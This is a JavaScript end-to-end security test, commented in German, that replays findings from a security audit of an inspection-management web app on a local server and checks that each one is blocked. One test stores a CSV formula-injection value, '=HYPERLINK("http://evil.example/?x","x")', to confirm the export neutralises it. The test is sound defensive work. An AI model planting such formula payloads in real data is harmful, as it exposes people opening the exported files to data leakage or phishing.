// E2E 08-security: stellt die Angriffswege aus dem Sicherheitsaudit nach und erwartet, dass sie blockiert sind.
// Nur lokal ausführen (legt einen zweiten Workspace an).
if (!process.env.DEMO_PASSWORD) throw new Error('DEMO_PASSWORD fehlt');
const BASE = process.env.BASE || 'http://localhost:5173';
const PW = process.env.DEMO_PASSWORD;
const fail = [];
const check = (ok, m) => {
  if (!ok) {
    fail.push(m);
    console.log('  ✗', m);
  }
};

/** Minimaler Client mit Cookie-Sitzung. */
function client() {
  let cookie = '';
  const call = async (path, { method, body, headers = {} } = {}) => {
    const r = await fetch(BASE + '/api' + path, {
      method: method ?? (body !== undefined ? 'POST' : 'GET'),
      headers: { 'x-pk': '1', cookie, ...(body !== undefined ? { 'content-type': 'application/json' } : {}), ...headers },
      body: body !== undefined ? JSON.stringify(body) : undefined,
    });
    const sc = r.headers.get('set-cookie');
    if (sc) cookie = sc.split(';')[0];
    const text = await r.text();
    let json = null;
    try {
      json = JSON.parse(text);
    } catch {
      /* kein JSON */
    }
    return { status: r.status, json, text, headers: r.headers };
  };
  call.login = (email, password = PW) => call('/auth/login', { body: { email, password } });
  return call;
}

(async () => {
  if (process.env.PROD) throw new Error('08-security nicht gegen Produktion ausführen');
  const owner = client();
  check((await owner.login('demo@example.com')).status === 200, 'Login Inhaber');

  console.log('· #1 Passwort-Link nicht workspace-übergreifend');
  const mallory = client();
  const reg = await mallory('/auth/register', { body: { company: 'Mallory GmbH', name: 'Mallory', email: `mallory${Date.now()}@example.com`, password: 'mallory-passwort-1' } });
  check(reg.status === 200, `zweiter Workspace registriert (${reg.status})`);
  const inv = await mallory('/account/members/invite', { body: { email: 'pruefer@example.com', role: 'viewer' } });
  const victim = client();
  await victim.login('pruefer@example.com');
  const acc = await victim(`/auth/invite/${inv.json.token}`, { body: { password: PW } });
  check(acc.status === 200, `Opfer nimmt Einladung an (${acc.status})`);
  const members = (await mallory('/account/members')).json.members;
  const v = members.find((m) => m.email === 'pruefer@example.com');
  const rl = await mallory(`/account/members/${v.id}/reset-link`, { method: 'POST' });
  check(rl.status === 403, `Reset-Link für Mitglied anderer Workspaces abgelehnt (${rl.status})`);
  // Admin darf keinen Link für einen anderen Admin erzeugen; Inhaber für Prüfer (nur hier Mitglied) schon
  const own = (await owner('/account/members')).json.members;
  const p2 = own.find((m) => m.email === 'pruefer2@example.com');
  check((await owner(`/account/members/${p2.id}/reset-link`, { method: 'POST' })).status === 200, 'Inhaber erzeugt Link für eigenen Prüfer');

  console.log('· #2 fremde Dateien über Begehungsfotos');
  const props = (await owner('/properties')).json;
  const w = await owner(`/properties/${props[0].id}/walkthroughs`, { body: {} });
  const wid = w.json?.id;
  const wd = (await owner(`/walkthroughs/${wid}`)).json;
  const q0 = wd.questions[0];
  const put = await owner(`/walkthroughs/${wid}`, {
    method: 'PUT',
    body: { answers: { [q0.id]: 'defect' }, findings: [{ questionId: q0.id, title: 'x', note: '', severity: 'low', photoKey: 'fremderworkspace/geheim' }], notes: '', participants: '', signature: null, signerName: '' },
  });
  check(put.status === 400, `fremder photoKey abgelehnt (${put.status})`);
  await owner(`/walkthroughs/${wid}`, { method: 'DELETE' });

  console.log('· #3 Freigabe-Token nicht für Lesezugriff');
  const viewer = client();
  await viewer.login('lesen@example.com');
  const vt = (await viewer('/tasks')).json;
  check(Array.isArray(vt) && vt.length > 0 && vt.every((t) => t.shareToken == null), 'Lesezugriff sieht keine Freigabe-Tokens');
  const ot = (await owner('/tasks')).json;
  check(ot.some((t) => t.shareToken), 'Inhaber sieht Freigabe-Tokens');

  console.log('· #7 CSV-Formel-Injection');
  const asset = (await owner('/assets')).json[0];
  const detail = (await owner(`/assets/${asset.id}`)).json;
  const patched = await owner(`/assets/${asset.id}`, {
    method: 'PATCH',
    body: { buildingId: detail.buildingId ?? asset.buildingId, location: '=HYPERLINK("http://evil.example/?x","x")', floor: detail.floor ?? '', manufacturer: detail.manufacturer ?? '', model: detail.model ?? '', attributes: detail.attributes ?? {} },
  });
  check(patched.status === 200, `Element mit Formel gespeichert (${patched.status} ${patched.text.slice(0, 80)})`);
  const csv = (await owner('/export/assets.csv')).text;
  check(csv.includes(`"'=HYPERLINK(`) || csv.includes(`'=HYPERLINK(`), 'Formel im CSV entschärft');
  check(!/;"?=HYPERLINK/.test(csv), 'keine Zelle beginnt mit =');

  console.log('· #8 Leseschlüssel kann keine Berichte löschen');
  const key = (await owner('/account/api-keys', { body: { name: 'sec-test', scope: 'read', expiresInDays: 1 } })).json.key;
  const created = await fetch(`${BASE}/api/reports?kind=compliance&title=Sicherheitstest&fileName=t.pdf`, {
    method: 'POST',
    headers: { 'x-pk': '1', 'content-type': 'application/pdf', cookie: await (async () => {
      const r = await fetch(BASE + '/api/auth/login', { method: 'POST', headers: { 'x-pk': '1', 'content-type': 'application/json' }, body: JSON.stringify({ email: 'demo@example.com', password: PW }) });
      return r.headers.get('set-cookie').split(';')[0];
    })() },
    body: '%PDF-1.4 test',
  }).then((r) => r.json());
  const del = await fetch(`${BASE}/api/reports/${created.id}`, { method: 'DELETE', headers: { authorization: `Bearer ${key}` } });
  check(del.status === 403, `Bericht löschen mit Leseschlüssel verboten (${del.status})`);

  console.log('· #10 Prüfer verwirft keine fremden Entwürfe');
  const insp = client();
  await insp.login('pruefer2@example.com');
  const a2 = (await owner('/assets')).json.find((x) => x.category === 'smoke_alarm');
  const draft = await owner(`/assets/${a2.id}/inspections`, { body: {} });
  const did = draft.json.id ?? draft.json.inspection?.id;
  check((await insp(`/inspections/${did}`, { method: 'DELETE' })).status === 409, 'fremder Entwurf nicht verwerfbar');
  check((await owner(`/inspections/${did}`, { method: 'DELETE' })).status === 200, 'eigener Entwurf verwerfbar');

  console.log('· #11 Push nur an bekannte Dienste');
  const ps = await owner('/push/subscribe', { body: { endpoint: 'https://intern.example.com/hook', keys: { p256dh: 'x', auth: 'y' } } });
  check(ps.status === 400, `beliebige Push-URL abgelehnt (${ps.status})`);

  console.log('· #12 Unterschrift nur als Bild');
  const d2 = await owner(`/assets/${a2.id}/inspections`, { body: {} });
  const d2id = d2.json.id ?? d2.json.inspection?.id;
  const sig = await owner(`/inspections/${d2id}`, { method: 'PUT', body: { kind: 'periodic', answers: {}, signature: 'https://tracker.example/pixel.gif' } });
  check(sig.status === 400, `externe Unterschrift-URL abgelehnt (${sig.status})`);
  await owner(`/inspections/${d2id}`, { method: 'DELETE' });

  console.log('· #4 Security-Header');
  const page = await fetch(BASE + '/login');
  const api = await fetch(BASE + '/api/health');
  console.log(`   Seite: CSP ${page.headers.get('content-security-policy') ? 'ja' : 'nein (Dev-Server liefert _headers nicht aus)'}`);
  check(api.headers.get('x-frame-options') === 'DENY' && /sandbox/.test(api.headers.get('content-security-policy') ?? ''), 'API-Header gesetzt');

  console.log('· #16 API-Schlüssel nach Entfernen widerrufen');
  const k2 = (await insp('/account/api-keys', { body: { name: 'x', scope: 'read' } })).status;
  check(k2 === 403, `Prüfer darf keine Schlüssel anlegen (${k2})`);

  console.log(fail.length ? `FAILED ${fail.length}: ${fail.join('; ')}` : 'ALL CHECKS OK');
  if (fail.length) process.exitCode = 1;
})().catch((e) => {
  console.log('FAIL', e.stack);
  process.exit(1);
});
